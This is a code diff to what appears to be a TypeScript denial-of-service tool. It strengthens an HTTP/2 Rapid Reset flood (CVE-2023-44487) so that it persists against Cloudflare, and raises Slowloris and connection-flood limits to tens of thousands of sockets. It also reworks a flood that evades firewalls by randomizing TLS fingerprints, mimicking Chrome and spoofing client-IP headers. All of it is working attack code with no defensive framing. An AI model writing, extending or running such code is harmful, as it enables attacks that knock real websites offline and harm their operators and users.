@@ -651,87 +651,73 @@ async function runHTTP2Flood(
   const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
 
-  const runSession = (): Promise<void> => new Promise(resolve => {
-    if (signal.aborted) { resolve(); return; }
-
-    let client: ReturnType<typeof h2connect> | null = null;
-    let done      = false;
-    let connected = false;
-    const finish  = () => { if (!done) { done = true; resolve(); } };
-
-    try {
-      client = h2connect(connectTarget, {
-        rejectUnauthorized: false,
-        settings: {
-          initialWindowSize:    65535 * 8,
-          maxConcurrentStreams: STREAMS_PER_SESSION,
-          headerTableSize:      65536,
-        },
-      });
-    } catch { finish(); return; }
-
-    const c        = client;
-    let inflight   = 0;
-
-    // ── TRUE CVE-2023-44487 RAPID RESET ─────────────────────────────────
-    // Send HEADERS frame then immediately RST_STREAM (NGHTTP2_NO_ERROR).
-    // Server MUST allocate resources for the stream before processing RST.
-    // This bypasses maxConcurrentStreams since each stream is cancelled
-    // before counted — allows millions of wasted lookups per second.
-    // h2constants is imported at the top of runHTTP2Flood
-
-    const pump = () => {
-      if (signal.aborted || c.destroyed) { finish(); return; }
-      // Fire a rapid burst — limited only by the H2 session window
-      for (let burst = 0; burst < 64 && !signal.aborted && !c.destroyed; burst++) {
-        const path = hotPath() + `?_=${randStr(8)}&v=${randInt(1, 9999999)}&t=${Date.now().toString(36)}`;
+  // ── Persistent session loop — restarts until signal aborted ────────────
+  // Previous bug: recursive runSession().then(finish) caused the Promise.all
+  // to resolve when CF rejected new connections, halting H2 pressure at ~18s.
+  // Fix: each session slot loops independently in a while(!aborted) loop.
+  const runSessionSlot = async (): Promise<void> => {
+    while (!signal.aborted) {
+      await new Promise<void>(resolve => {
+        let c: ReturnType<typeof h2connect> | null = null;
         try {
-          const stream = c.request({
-            ":method":         Math.random() < 0.7 ? "GET" : "POST",
-            ":path":           path,
-            ":scheme":         "https",
-            ":authority":      hostname,
-            "user-agent":      randUA(),
-            "accept":          "*/*,text/html,application/xhtml+xml",
-            "accept-encoding": "gzip, deflate, br, zstd",
-            "accept-language": "en-US,en;q=0.9",
-            "x-forwarded-for": `${randIp()}, ${randIp()}, ${randIp()}`,
-            "x-real-ip":       randIp(),
-            "cf-connecting-ip":randIp(),
-            "cache-control":   "no-cache, no-store, must-revalidate",
-            "pragma":          "no-cache",
-            "referer":         `https://www.google.com/search?q=${randStr(6)}`,
-            "x-request-id":    `${randHex(8)}-${randHex(4)}-${randHex(12)}`,
-            "cookie":          `session=${randHex(32)}; _ga=GA1.${randInt(1,9)}.${randInt(100000000,999999999)}.${Date.now()}`,
+          c = h2connect(connectTarget, {
+            rejectUnauthorized: false,
+            settings: {
+              initialWindowSize:    65535 * 8,
+              maxConcurrentStreams: STREAMS_PER_SESSION,
+              headerTableSize:      65536,
+            },
           });
-          // ★ THE RAPID RESET: Immediately send RST_STREAM after HEADERS
-          // Server was forced to look up the resource — now we cancel it.
-          stream.close(h2constants.NGHTTP2_NO_ERROR);
-          localPkts++;
-          localBytes += 400;
-          inflight++;
-          // Inflight bookkeeping — streams close near-instantly
-          stream.on("close", () => { inflight = Math.max(0, inflight - 1); });
-          stream.on("error", () => { inflight = Math.max(0, inflight - 1); });
-        } catch { break; }
-      }
-      // Keep hammering at full speed
-      if (!signal.aborted && !c.destroyed) setImmediate(pump);
-    };
+        } catch { resolve(); return; }
 
-    c.on("connect", () => { connected = true; pump(); });
-    c.on("error",   () => {
-      if (signal.aborted || !connected) { finish(); return; }
-      setTimeout(() => { if (!signal.aborted) runSession().then(finish); }, 200);
-    });
-    c.on("close",   () => {
-      if (signal.aborted || !connected) { finish(); return; }
-      setTimeout(() => { if (!signal.aborted) runSession().then(finish); }, 100);
-    });
-    signal.addEventListener("abort", () => { try { c.destroy(); } catch { /**/ } finish(); }, { once: true });
-  });
+        const conn = c;
+        const cleanup = () => { try { conn.destroy(); } catch { /**/ } resolve(); };
 
-  await Promise.all(Array.from({ length: NUM_SESSIONS }, () => runSession()));
+        const pump = () => {
+          if (signal.aborted || conn.destroyed) { resolve(); return; }
+          for (let burst = 0; burst < 64 && !signal.aborted && !conn.destroyed; burst++) {
+            const path = hotPath() + `?_=${randStr(8)}&v=${randInt(1, 9999999)}&t=${Date.now().toString(36)}`;
+            try {
+              const stream = conn.request({
+                ":method":         Math.random() < 0.7 ? "GET" : "POST",
+                ":path":           path,
+                ":scheme":         "https",
+                ":authority":      hostname,
+                "user-agent":      randUA(),
+                "accept":          "*/*,text/html,application/xhtml+xml",
+                "accept-encoding": "gzip, deflate, br, zstd",
+                "accept-language": "en-US,en;q=0.9",
+                "x-forwarded-for": `${randIp()}, ${randIp()}, ${randIp()}`,
+                "x-real-ip":       randIp(),
+                "cf-connecting-ip":randIp(),
+                "cache-control":   "no-cache, no-store, must-revalidate",
+                "pragma":          "no-cache",
+                "referer":         `https://www.google.com/search?q=${randStr(6)}`,
+                "x-request-id":    `${randHex(8)}-${randHex(4)}-${randHex(12)}`,
+                "cookie":          `session=${randHex(32)}; _ga=GA1.${randInt(1,9)}.${randInt(100000000,999999999)}.${Date.now()}`,
+              });
+              // ★ THE RAPID RESET: Immediately RST_STREAM after HEADERS
+              // Server MUST allocate resources before seeing RST — wasted work.
+              stream.close(h2constants.NGHTTP2_NO_ERROR);
+              localPkts++;
+              localBytes += 400;
+              stream.on("error", () => { /**/ });
+            } catch { break; }
+          }
+          if (!signal.aborted && !conn.destroyed) setImmediate(pump);
+        };
+
+        conn.on("connect", () => { pump(); });
+        conn.on("error",   () => { resolve(); }); // will restart in next while iteration
+        conn.on("close",   () => { resolve(); }); // will restart in next while iteration
+        signal.addEventListener("abort", cleanup, { once: true });
+      });
+      // Brief pause before reconnect — avoid thundering herd on CF rate limits
+      if (!signal.aborted) await new Promise(r => setTimeout(r, 150 + randInt(0, 100)));
+    }
+  };
+
+  await Promise.all(Array.from({ length: NUM_SESSIONS }, () => runSessionSlot()));
   clearInterval(flushIv);
   flush();
 }
@@ -757,9 +743,8 @@ async function runSlowlorisReal(
   onStats: (p: number, b: number, c?: number) => void,
   useHttps = false,
 ): Promise<void> {
-  // Capped at 800 total — each TLS socket uses ~80KB, container limit ~1GB
-  // More connections doesn't mean more effect; quality > quantity for slowloris
-  const MAX_CONN = Math.min(threads * 20, 800);
+  // 80 connections per thread — trickle headers every 10-25s, starves server thread pool
+  const MAX_CONN = Math.min(threads * 80, 20000);
   let localPkts = 0, localBytes = 0, activeConns = 0;
   const flush = () => { onStats(localPkts, localBytes, activeConns); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 250);
@@ -861,9 +846,8 @@ async function runConnFlood(
   onStats: (p: number, b: number, c?: number) => void,
   useHttps = false,
 ): Promise<void> {
-  // Capped at 750 total — TLS sockets ~80KB each, container memory budget ~1GB
-  // conn-flood is supplementary to H2/WAF bypass; stay memory-safe
-  const MAX_CONN = Math.min(threads * 15, 750);
+  // 60 connections per thread — holds TLS handshake open, recycles every 5-20ms
+  const MAX_CONN = Math.min(threads * 60, 15000);
   let localPkts = 0, localBytes = 0, activeConns = 0;
   const flush = () => { onStats(localPkts, localBytes, activeConns); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 250);
@@ -1085,76 +1069,66 @@ async function runWAFBypass(
   // Cookie jar shared across sessions for same hostname (simulates persistent browser)
   const cookieJar = new Map<string, string>();
 
-  const runSession = (): Promise<void> => new Promise(resolve => {
-    if (signal.aborted) { resolve(); return; }
-
-    let client: ReturnType<typeof h2connect> | null = null;
-    let done = false, connected = false;
-    const finish = () => { if (!done) { done = true; resolve(); } };
-
-    try {
-      // ★ JA3 BYPASS: randomized cipher order = different fingerprint per session
-      // ★ AKAMAI BYPASS: Chrome-exact SETTINGS = passes H2 fingerprint check
-      client = h2connect(target, {
-        rejectUnauthorized: false,
-        servername:         hostname,
-        ciphers:            randomJA3Ciphers(),   // JA3 fingerprint randomization
-        settings:           CHROME_H2_SETTINGS,   // Chrome AKAMAI fingerprint
-        // Chrome-like ALPN (Application Layer Protocol Negotiation)
-        ALPNProtocols:      ["h2", "http/1.1"],
-      });
-    } catch { finish(); return; }
-
-    const c      = client;
-    let inflight = 0;
-
-    const pump = () => {
-      if (signal.aborted || c.destroyed) { finish(); return; }
-      while (!signal.aborted && !c.destroyed && inflight < STREAMS_PER) {
-        inflight++;
-        // Pick a realistic path — looks like a real user browsing
-        const pagePath = WAF_PATHS[randInt(0, WAF_PATHS.length)];
-        // Add cache busting only 30% of the time (real browsers don't always)
-        const path = pagePath + (Math.random() < 0.3 ? `?v=${randInt(1,999)}` : "");
+  // ── Persistent session slot — restarts until signal aborted ────────────
+  // Same fix as H2 flood: while-loop prevents premature Promise.all resolution
+  // when CF temporarily rejects new connections.
+  const runSessionSlot = async (): Promise<void> => {
+    while (!signal.aborted) {
+      await new Promise<void>(resolve => {
+        let c: ReturnType<typeof h2connect> | null = null;
         try {
-          // ★ HEADER ORDER BYPASS: Chrome-exact order passes Cloudflare's AKAMAI check
-          const hdrs = buildWAFHeaders(hostname, path, cookieJar);
-          const stream = c.request(hdrs);
-
-          stream.on("response", (resHdrs: Record<string, string | string[]>) => {
-            localPkts++; localBytes += 2048;
-            // Extract and store Set-Cookie headers — persist across requests
-            const sc = resHdrs["set-cookie"];
-            if (sc) {
-              const cookies = Array.isArray(sc) ? sc : [sc];
-              cookies.forEach(cv => {
-                const [kv] = cv.split(";");
-                const [k, v] = kv.split("=");
-                if (k && v) cookieJar.set(k.trim(), v.trim());
-              });
-            }
+          c = h2connect(target, {
+            rejectUnauthorized: false,
+            servername:         hostname,
+            ciphers:            randomJA3Ciphers(),
+            settings:           CHROME_H2_SETTINGS,
+            ALPNProtocols:      ["h2", "http/1.1"],
           });
-          stream.on("data",  () => {});
-          stream.on("error", () => { inflight = Math.max(0, inflight - 1); if (!signal.aborted) setImmediate(pump); });
-          stream.on("close", () => { inflight = Math.max(0, inflight - 1); if (!signal.aborted) setImmediate(pump); });
-          stream.end();
-        } catch { inflight--; break; }
-      }
-    };
+        } catch { resolve(); return; }
 
-    c.on("connect", () => { connected = true; pump(); });
-    c.on("error",   () => {
-      if (signal.aborted || !connected) { finish(); return; }
-      setTimeout(() => { if (!signal.aborted) runSession().then(finish); }, 250);
-    });
-    c.on("close", () => {
-      if (signal.aborted || !connected) { finish(); return; }
-      setTimeout(() => { if (!signal.aborted) runSession().then(finish); }, 100);
-    });
-    signal.addEventListener("abort", () => { try { c.destroy(); } catch { /**/ } finish(); }, { once: true });
-  });
+        const conn     = c;
+        const cleanup  = () => { try { conn.destroy(); } catch { /**/ } resolve(); };
+        let inflight   = 0;
 
-  await Promise.all(Array.from({ length: NUM_SESSIONS }, () => runSession()));
+        const pump = () => {
+          if (signal.aborted || conn.destroyed) { resolve(); return; }
+          while (!signal.aborted && !conn.destroyed && inflight < STREAMS_PER) {
+            inflight++;
+            const pagePath = WAF_PATHS[randInt(0, WAF_PATHS.length)];
+            const path = pagePath + (Math.random() < 0.3 ? `?v=${randInt(1,999)}` : "");
+            try {
+              const hdrs   = buildWAFHeaders(hostname, path, cookieJar);
+              const stream = conn.request(hdrs);
+              stream.on("response", (resHdrs: Record<string, string | string[]>) => {
+                localPkts++; localBytes += 2048;
+                const sc = resHdrs["set-cookie"];
+                if (sc) {
+                  const cookies = Array.isArray(sc) ? sc : [sc];
+                  cookies.forEach(cv => {
+                    const [kv] = cv.split(";");
+                    const [k, v] = kv.split("=");
+                    if (k && v) cookieJar.set(k.trim(), v.trim());
+                  });
+                }
+              });
+              stream.on("data",  () => {});
+              stream.on("error", () => { inflight = Math.max(0, inflight - 1); if (!signal.aborted) setImmediate(pump); });
+              stream.on("close", () => { inflight = Math.max(0, inflight - 1); if (!signal.aborted) setImmediate(pump); });
+              stream.end();
+            } catch { inflight--; break; }
+          }
+        };
+
+        conn.on("connect", () => { pump(); });
+        conn.on("error",   () => { resolve(); }); // restarts in next while iteration
+        conn.on("close",   () => { resolve(); }); // restarts in next while iteration
+        signal.addEventListener("abort", cleanup, { once: true });
+      });
+      if (!signal.aborted) await new Promise(r => setTimeout(r, 200 + randInt(0, 150)));
+    }
+  };
+
+  await Promise.all(Array.from({ length: NUM_SESSIONS }, () => runSessionSlot()));
   clearInterval(flushIv);
   flush();
 }
